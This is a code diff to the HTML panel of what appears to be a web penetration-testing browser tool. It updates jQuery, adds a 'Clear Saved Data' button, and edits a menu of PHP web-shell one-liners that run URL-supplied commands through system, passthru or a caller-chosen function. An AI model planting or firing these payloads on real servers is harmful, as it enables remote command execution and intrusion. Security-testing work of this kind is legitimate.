@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8">
     <link href="panel.css" rel="stylesheet" type="text/css" />
-    <script type="text/javascript" src="jquery-3.2.1.min.js" charset="utf-8"></script>
+    <script type="text/javascript" src="jquery-3.7.1.min.js" charset="utf-8"></script>
     <script type="text/javascript" src="panel.js" charset="utf-8"></script>
     <script type="text/javascript" src="waiting.js" charset="utf-8"></script>
     <!-- 
@@ -52,7 +52,7 @@
             <div class="menu">
                 <div class="menuitem">&lt;?php phpinfo(); ?></div>
                 <div class="menuitem">&lt;?= system($_GET['c']); ?></div>
-                <div class="menuitem">&lt;?= system($_GET['c']); ?></div>
+                <div class="menuitem">&lt;?= passthru($_GET['c']); ?></div>
                 <div class="menuitem">&lt;?= $_GET['cm']($_GET['prm']); ?></div>
             </div>
         </div><!--
@@ -73,7 +73,8 @@
     <section id="section2"><!--
         --><div class="checkboxes"><input id="checkBoxPost" type="checkbox">Enable Post Data<!--
         --><input id="checkBoxCookies" type="checkbox" class="check2">Change Cookies<!--
-        --><input id="checkBoxReferrer" type="checkbox" class="check2">Enable Referrer</div><!--
+        --><input id="checkBoxReferrer" type="checkbox" class="check2">Enable Referrer<!--
+        --><button id="clearSavedData" class="button clearsaved" type="button">Clear Saved Data</button></div><!--
     --></section>
     <section id="section3"><!--
         --><div class="main_left">Post Data</div><!--
